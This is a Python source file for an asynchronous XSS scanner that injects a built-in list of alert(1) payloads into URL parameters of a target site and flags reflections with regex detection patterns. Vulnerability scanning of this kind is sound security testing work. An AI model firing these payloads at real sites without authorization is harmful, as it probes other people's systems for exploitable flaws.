# src/tools/xss_tester.py

import aiohttp
from typing import Dict, List
from urllib.parse import urlencode, urlparse, parse_qs
from loguru import logger
import re

class XSSTester:
    def __init__(self):
        self.payloads = {
            'reflected': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                'javascript:alert(1)',
                '<iframe src="javascript:alert(1)">',
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '<body onload=alert(1)>',
                '<input autofocus onfocus=alert(1)>',
                '<select autofocus onfocus=alert(1)>',
                '<textarea autofocus onfocus=alert(1)>',
                '<keygen autofocus onfocus=alert(1)>',
                '<video src=x onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>',
            ],
            'dom': [
                '#<script>alert(1)</script>',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
            ],
            'attribute': [
                '" onload="alert(1)',
                "' onload='alert(1)",
                '"><img src=x onerror=alert(1)>',
            ]
        }
        
        self.detection_patterns = [
            r'<script[^>]*>.*?alert\(1\).*?</script>',
            r'onerror\s*=\s*["\']?alert\(1\)',
            r'onload\s*=\s*["\']?alert\(1\)',
            r'<img[^>]*src\s*=\s*["\']?x["\']?[^>]*onerror',
        ]
        
        logger.info("XSS tester initialized")
    
    async def test(
        self,
        url: str,
        parameters: List[str],
        payload_type: str = "all"
    ) -> Dict:
        """
        Test for XSS vulnerabilities
        
        Args:
            url: Target URL
            parameters: Parameters to test
            payload_type: Type of payloads to use
        
        Returns:
            Test results
        """
        vulnerabilities = []
        
        try:
            # Get payloads based on type
            if payload_type == "all":
                test_payloads = (
                    self.payloads['reflected'] + 
                    self.payloads['dom'] + 
                    self.payloads['attribute']
                )
            else:
                test_payloads = self.payloads.get(payload_type, [])
            
            async with aiohttp.ClientSession() as session:
                for param in parameters:
                    for payload in test_payloads:
                        result = await self._test_parameter(
                            session, url, param, payload
                        )
                        
                        if result['vulnerable']:
                            vulnerabilities.append({
                                'parameter': param,
                                'payload': payload,
                                'type': result['type'],
                                'context': result['context'],
                                'severity': result['severity']
                            })
                            logger.warning(f"XSS found in {param}: {payload}")
            
            return {
                'url': url,
                'vulnerable': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities,
                'parameters_tested': len(parameters),
                'payloads_tested': len(test_payloads)
            }
            
        except Exception as e:
            logger.error(f"XSS testing error for {url}: {str(e)}")
            return {
                'url': url,
                'error': str(e),
                'vulnerable': False,
                'vulnerabilities': []
            }
    
    async def _test_parameter(
        self,
        session: aiohttp.ClientSession,
        url: str,
        parameter: str,
        payload: str
    ) -> Dict:
        """Test a single parameter with a payload"""
        try:
            # Parse URL
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Inject payload
            params[parameter] = [payload]
            
            # Build test URL
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
            
            # Send request
            async with session.get(test_url, timeout=10) as response:
                content = await response.text()
                
                # Check if payload is reflected
                if payload in content:
                    # Check if it's executable
                    for pattern in self.detection_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            return {
                                'vulnerable': True,
                                'type': 'reflected',
                                'context': self._detect_context(content, payload),
                                'severity': 'high'
                            }
                    
                    # Payload reflected but encoded
                    return {
                        'vulnerable': True,
                        'type': 'reflected',
                        'context': 'encoded',
                        'severity': 'medium'
                    }
            
            return {'vulnerable': False}
            
        except Exception as e:
            logger.error(f"Parameter test error: {str(e)}")
            return {'vulnerable': False}
    
    def _detect_context(self, content: str, payload: str) -> str:
        """Detect the context where payload appears"""
        # Find payload in content
        index = content.find(payload)
        if index == -1:
            return 'unknown'
        
        # Get surrounding context
        context = content[max(0, index-50):min(len(content), index+len(payload)+50)]
        
        if '<script' in context.lower():
            return 'script_tag'
        elif 'onerror' in context.lower() or 'onload' in context.lower():
            return 'event_handler'
        elif '<' in context and '>' in context:
            return 'html_tag'
        elif '"' in context or "'" in context:
            return 'attribute'
        else:
            return 'html_body'